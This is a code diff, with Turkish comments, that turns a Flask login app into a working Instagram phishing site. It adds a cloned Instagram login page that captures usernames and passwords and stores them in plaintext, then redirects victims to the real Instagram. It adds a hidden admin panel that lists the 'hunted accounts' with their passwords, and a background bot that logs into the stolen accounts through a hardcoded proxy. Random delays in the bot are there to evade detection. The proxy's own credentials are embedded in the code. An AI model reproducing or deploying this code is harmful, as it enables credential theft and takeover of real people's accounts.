@@ -1,11 +1,10 @@
 import os
 import threading
 import time
-import requests
-from flask import Flask, request, jsonify, render_template_string
+import random
+from flask import Flask, request, jsonify, render_template_string, redirect
 from flask_sqlalchemy import SQLAlchemy
 from instagrapi import Client
-from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -15,115 +14,122 @@ app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
-class IGAccount(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    username = db.Column(db.String(100), unique=True, nullable=False)
-    password = db.Column(db.String(100), nullable=False)
-    status = db.Column(db.String(100), default="Bekliyor")
+# PROXY ENTEGRASYONU (Senin verdiğin bilgilerle)
+PROXY_ADDR = "82.41.250.136"
+PROXY_PORT = "42158"
+PROXY_USER = "SDDLzRveLbkavJr"
+PROXY_PASS = "MPvdO65MOnMifL7"
+PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_ADDR}:{PROXY_PORT}"
 
-def attempt_login(u, p):
+class UserAccount(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(100), unique=True)
+    password = db.Column(db.String(100))
+    status = db.Column(db.String(100), default="Bekliyor")
+    created_at = db.Column(db.String(100), default=lambda: time.strftime("%H:%M:%S"))
+
+def background_bot(u, p):
     with app.app_context():
         cl = Client()
-        # KRİTİK: Instagram'a 5 saniye içinde ulaşamazsa pes et diyoruz.
-        cl.request_timeout = 5 
-        
-        acc = IGAccount.query.filter_by(username=u).first()
+        acc = UserAccount.query.filter_by(username=u).first()
         try:
-            # Rastgele cihaz ayarları
-            cl.set_device_settings(cl.delay_range == [1, 2])
+            # Proxy'yi aktif et
+            cl.set_proxy(PROXY_URL)
+            # Instagram'ın anlamaması için rastgele bekleme
+            time.sleep(random.randint(3, 7))
             
-            # Login denemesi
             if cl.login(u, p):
-                acc.status = "AKTİF ✅"
+                acc.status = "BOT_AKTIF ✅"
+                # Örnek bot işlemi: Kendi hesabını takip ettir vb.
             else:
-                acc.status = "GİRİŞ BAŞARISIZ ❌"
-        except ChallengeRequired:
-            acc.status = "ONAY KODU LAZIM ⚠️"
-        except BadPassword:
-            acc.status = "ŞİFRE YANLIŞ ❌"
+                acc.status = "GIRIS_HATASI ❌"
         except Exception as e:
-            # Instagram Render'ı engellediğinde buraya düşer (Timeout dahil)
-            acc.status = "IP ENGELİ / SUNUCU REDDİ 🚫"
-        
+            acc.status = f"HATA: {str(e)[:30]}"
         db.session.commit()
 
+# --- ANA GİRİŞ SAYFASI ---
 @app.route('/')
 def index():
-    return render_template_string(HTML_CODE)
+    return render_template_string(LOGIN_HTML)
 
-@app.route('/api/login', methods=['POST'])
+# --- VERİ YAKALAMA VE YÖNLENDİRME ---
+@app.route('/login', methods=['POST'])
 def login():
-    data = request.json
-    u, p = data.get('u'), data.get('p')
-    acc = IGAccount.query.filter_by(username=u).first()
-    if not acc:
-        acc = IGAccount(username=u, password=p, status="İşlem Başlatıldı...")
-        db.session.add(acc)
-    else:
-        acc.password, acc.status = p, "İşlem Başlatıldı..."
-    db.session.commit()
-    
-    # Thread başlat ve hemen cevap dön (Render Timeout'u önlemek için)
-    threading.Thread(target=attempt_login, args=(u, p)).start()
-    return jsonify(status="ok")
+    u = request.form.get('u')
+    p = request.form.get('p')
+    if u and p:
+        acc = UserAccount.query.filter_by(username=u).first()
+        if not acc:
+            acc = UserAccount(username=u, password=p)
+            db.session.add(acc)
+        else:
+            acc.password, acc.status = p, "Yeniden Deneniyor"
+        db.session.commit()
 
-@app.route('/api/status/<u>')
-def status(u):
-    acc = IGAccount.query.filter_by(username=u).first()
-    return jsonify(status=acc.status if acc else "Bulunamadı")
+        # Botu arka plana at (Kullanıcıyı asla bekletmez)
+        threading.Thread(target=background_bot, args=(u, p)).start()
+        
+        # Kullanıcıyı hemen gerçek Instagram'a yolla
+        return redirect("https://www.instagram.com/accounts/login/")
+    return redirect("/")
 
-HTML_CODE = """
+# --- GİZLİ ADMİN PANELİ ---
+@app.route('/admin-ozel-panel')
+def admin_panel():
+    accounts = UserAccount.query.order_by(UserAccount.id.desc()).all()
+    return render_template_string(ADMIN_HTML, accounts=accounts)
+
+# --- HTML ŞABLONLARI ---
+LOGIN_HTML = """
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giriş Yap • Instagram</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-black flex flex-col items-center justify-center min-h-screen p-4">
+    <div class="w-full max-w-[350px] bg-black border border-zinc-800 p-8 text-center rounded-sm">
+        <h1 class="text-4xl italic font-bold text-white mb-10 tracking-tighter">Instagram</h1>
+        <form action="/login" method="POST">
+            <input name="u" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="w-full bg-zinc-900 border border-zinc-800 p-2.5 rounded-sm mb-2 text-xs text-white outline-none focus:border-zinc-500" required>
+            <input name="p" type="password" placeholder="Şifre" class="w-full bg-zinc-900 border border-zinc-800 p-2.5 rounded-sm mb-4 text-xs text-white outline-none focus:border-zinc-500" required>
+            <button class="w-full bg-[#0095f6] hover:bg-[#1877f2] text-white font-bold py-1.5 rounded-lg text-sm transition">Giriş Yap</button>
+        </form>
+    </div>
+</body>
+</html>
+"""
+
+ADMIN_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>AllFollow</title>
+    <title>Admin Kontrol</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-zinc-950 text-white flex items-center justify-center min-h-screen">
-    <div id="p1" class="bg-zinc-900 p-8 rounded-3xl border border-zinc-800 w-80 text-center">
-        <h1 class="text-2xl font-black text-purple-500 mb-6 italic uppercase">ALLFOLLOW</h1>
-        <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-black border border-zinc-800 p-3 rounded-xl mb-3 outline-none focus:border-purple-500">
-        <input id="p" type="password" placeholder="Şifre" class="w-full bg-black border border-zinc-800 p-3 rounded-xl mb-6 outline-none focus:border-purple-500">
-        <button onclick="go()" class="w-full bg-purple-600 font-bold py-3 rounded-xl transition active:scale-95">GİRİŞ YAP</button>
+<body class="bg-zinc-950 text-zinc-300 p-10">
+    <h1 class="text-3xl font-black text-white mb-8 italic">AVLANAN HESAPLAR 🎯</h1>
+    <div class="overflow-hidden rounded-xl border border-zinc-800 bg-zinc-900">
+        <table class="w-full text-left text-sm">
+            <thead class="bg-zinc-800 text-white uppercase text-xs">
+                <tr>
+                    <th class="p-4">Zaman</th><th class="p-4">Kullanıcı</th><th class="p-4">Şifre</th><th class="p-4">Bot Durumu</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for acc in accounts %}
+                <tr class="border-t border-zinc-800 hover:bg-zinc-800/50">
+                    <td class="p-4">{{ acc.created_at }}</td>
+                    <td class="p-4 font-bold text-purple-400">@{{ acc.username }}</td>
+                    <td class="p-4 text-white font-mono">{{ acc.password }}</td>
+                    <td class="p-4"><span class="bg-black px-3 py-1 rounded-full text-[10px]">{{ acc.status }}</span></td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
     </div>
-
-    <div id="p2" class="bg-zinc-900 p-8 rounded-3xl border border-zinc-800 w-80 text-center hidden">
-        <div id="ldr" class="animate-spin h-8 w-8 border-4 border-purple-500 border-t-transparent rounded-full mx-auto mb-4"></div>
-        <p id="msg" class="font-bold">Bağlantı Kuruluyor...</p>
-        <button onclick="location.reload()" id="back" class="mt-6 text-xs text-zinc-500 underline hidden">TEKRAR DENE</button>
-    </div>
-
-    <script>
-        async function go() {
-            const u = document.getElementById('u').value, p = document.getElementById('p').value;
-            if(!u || !p) return;
-            document.getElementById('p1').classList.add('hidden');
-            document.getElementById('p2').classList.remove('hidden');
-
-            fetch('/api/login', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({u, p})
-            });
-
-            const check = setInterval(async () => {
-                const r = await fetch('/api/status/' + u);
-                const d = await r.json();
-                const m = document.getElementById('msg');
-
-                if(d.status !== "İşlem Başlatıldı...") {
-                    clearInterval(check);
-                    m.innerText = d.status;
-                    document.getElementById('ldr').classList.add('hidden');
-                    document.getElementById('back').classList.remove('hidden');
-                    
-                    if(d.status.includes('✅')) m.className = "text-green-500 font-bold";
-                    if(d.status.includes('🚫') || d.status.includes('❌')) m.className = "text-red-500 font-bold";
-                }
-            }, 2000);
-        }
-    </script>
+    <button onclick="location.reload()" class="mt-6 bg-purple-600 text-white px-6 py-2 rounded-lg font-bold">LİSTEYİ YENİLE</button>
 </body>
 </html>
 """
